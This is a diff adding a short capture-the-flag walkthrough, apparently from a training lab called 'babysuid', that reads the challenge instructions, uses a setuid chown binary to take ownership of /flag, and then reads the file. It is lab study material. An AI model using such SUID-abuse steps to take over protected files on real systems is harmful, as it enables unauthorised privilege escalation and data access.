@@ -1,0 +1,4 @@
+1 Connect to terminal 
+2 Read instructions : /challenge/babysuid
+3 Change permision : /challenge/bin/chown hacker /flag
+4 Read flag : cat /flag
